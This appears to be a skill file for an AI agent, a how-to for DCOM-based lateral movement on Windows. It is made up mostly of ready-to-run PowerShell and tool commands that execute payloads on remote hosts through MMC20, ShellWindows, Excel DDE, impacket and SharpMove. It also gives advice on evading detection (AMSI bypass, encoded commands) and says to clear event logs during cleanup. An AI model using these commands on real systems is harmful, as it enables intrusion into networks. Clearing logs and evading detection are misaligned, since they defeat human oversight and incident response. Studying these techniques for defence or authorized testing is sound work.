---
name: dcom-lateral-movement
description: Use DCOM objects for Windows lateral movement in authorized security assessments. Use this skill whenever you need to move laterally between Windows systems, execute commands remotely via DCOM, or enumerate DCOM applications. Trigger this skill for any Windows penetration testing task involving remote code execution, DCOM exploitation, MMC20.Application, ShellWindows, Excel DCOM objects, or when you have admin credentials and need to pivot to other systems.
---

# DCOM Lateral Movement

A skill for performing lateral movement between Windows systems using Distributed Component Object Model (DCOM) objects. This skill is designed for **authorized security assessments only**.

## When to Use This Skill

Use this skill when:
- You have valid credentials for a Windows domain and need to pivot to other systems
- You're performing authorized penetration testing or red team operations
- You need to execute commands on remote Windows systems without traditional SMB/RDP
- You want to enumerate available DCOM applications on target systems
- You're testing DCOM security configurations and permissions

## Prerequisites

- Valid domain credentials with appropriate permissions (typically admin or domain admin)
- Network connectivity to target systems (DCOM ports: 135, dynamic RPC ports)
- PowerShell 3.0+ on the attacker machine
- Target systems must have DCOM enabled (default on most Windows systems)

## Core Techniques

### 1. MMC20.Application

The MMC20.Application COM object enables remote command execution via the `ExecuteShellCommand` method.

**Basic Usage:**
```powershell
# Connect to remote DCOM object
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "<TARGET_IP>"))

# Execute a command
$com.Document.ActiveView.ExecuteShellCommand("<COMMAND>", $null, $null, "7")
```

**Example - List remote users:**
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", "/c dir \\10.10.10.10\c$\Users", $null, "7")
```

**Check available methods:**
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "<TARGET_IP>"))
$com.Document.ActiveView | Get-Member
```

### 2. ShellWindows & ShellBrowserWindow

These objects lack explicit LaunchPermissions, making them exploitable for lateral movement.

**ShellWindows (requires CLSID):**
```powershell
# Get CLSID using OleView .NET or from registry
$clsid = "{<CLSID_GUID>}"
$com = [Type]::GetTypeFromCLSID($clsid, "<TARGET_IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

**ShellBrowserWindow:**
```powershell
$com = [Type]::GetTypeFromCLSID("{C08AFD90-F2A1-11D1-8455-00A0C91F3880}", "<TARGET_IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("<COMMAND>", $null, $null, $null, 0)
```

### 3. Excel DCOM Objects

Excel DCOM can be used for lateral movement via DDE (Dynamic Data Exchange).

**Detect Office version:**
```powershell
$Com = [Type]::GetTypeFromProgID("Excel.Application", "<TARGET_IP>")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
```

**Execute via Excel DDE:**
```powershell
$Com = [Type]::GetTypeFromProgID("Excel.Application", "<TARGET_IP>")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c <YOUR_COMMAND>")
```

**Register XLL (for DLL execution):**
```powershell
$Com = [Type]::GetTypeFromProgID("Excel.Application", "<TARGET_IP>")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("<PATH_TO_DLL>")
```

## Automation Tools

### Impacket dcomexec.py

```bash
# Basic command execution
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# With hash
dcomexec.py -hashes <LMHASH>:<NTHASH> 'DOMAIN'/'USER'@'target_ip' "cmd.exe /c whoami"

# With kerberos
dcomexec.py -k -no-pass 'USER'@'target_ip' "cmd.exe /c whoami"
```

### SharpLateral

```bash
# Execute remote file via DCOM
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe

# Available methods: reddcom, shellbrowser, excel
SharpLateral.exe <METHOD> HOSTNAME <COMMAND_OR_PATH>
```

### SharpMove

```bash
# DCOM lateral movement with AMSI bypass
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe" method=ShellBrowserWindow amsi=true

# Available methods: ShellBrowserWindow, MMC20, Excel
SharpMove.exe action=dcom computername=<TARGET> command="<COMMAND>" method=<METHOD> amsi=<true|false>
```

### Invoke-DCOM.ps1 (Empire)

```powershell
# Import the module
Import-Module .\Invoke-DCOM.ps1

# Execute command via MMC20
Invoke-DCOM -ComputerName <TARGET> -Method MMC20 -Command "whoami"

# Execute via Excel DDE
Invoke-DCOM -ComputerName <TARGET> -Method ExcelDDE -Command "whoami"

# Detect Office version
Invoke-DCOM -ComputerName <TARGET> -Method DetectOffice

# Register XLL
Invoke-DCOM -ComputerName <TARGET> -Method RegisterXLL -DllPath "<PATH>"
```

## Enumeration

### List DCOM Applications

```powershell
# On target system, enumerate available DCOM applications
Get-CimInstance Win32_DCOMApplication

# Or via WMI
Get-WmiObject -Class Win32_DCOMApplication
```

### Check DCOM Permissions

```powershell
# Check for objects without explicit LaunchPermissions
# Use OleView .NET to filter objects
# Look for missing entries in HKCR:\AppID\{guid}
```

## Workflow Guide

### Step 1: Reconnaissance

1. Enumerate available DCOM applications on target
2. Check network connectivity to DCOM ports (135, dynamic RPC)
3. Verify credentials have appropriate permissions

### Step 2: Select Technique

Choose based on target configuration:
- **MMC20.Application**: Most reliable, works on most Windows systems
- **ShellWindows/ShellBrowserWindow**: Good alternative, no explicit permissions
- **Excel DCOM**: Requires Excel installed, useful for file-based attacks

### Step 3: Execute

1. Test connectivity with a simple command (`whoami`)
2. Execute desired payload or command
3. Verify execution was successful

### Step 4: Cleanup (if needed)

- Remove any uploaded files
- Clear event logs if required
- Document findings

## Detection Evasion

- Use AMSI bypass tools (SharpMove has built-in support)
- Execute from memory when possible
- Use encoded commands to avoid signature detection
- Time operations to blend with normal activity

## Limitations

- Requires valid credentials with appropriate permissions
- DCOM must be enabled on target (default on most Windows systems)
- Firewall must allow DCOM traffic (ports 135, dynamic RPC)
- Some techniques require specific software (Excel, etc.)
- May be detected by EDR solutions monitoring DCOM activity

## References

- [Lateral Movement Using the MMC20.Application COM Object](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [Lateral Movement via DCOM Round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [Leveraging Excel DDE for Lateral Movement via DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [Empire Invoke-DCOM Module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)
- [SharpLateral](https://github.com/mertdas/SharpLateral)
- [SharpMove](https://github.com/0xthirteen/SharpMove)
- [Microsoft DCOM Documentation](https://msdn.microsoft.com/en-us/library/cc226801.aspx)
- [Microsoft COM Documentation](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx)
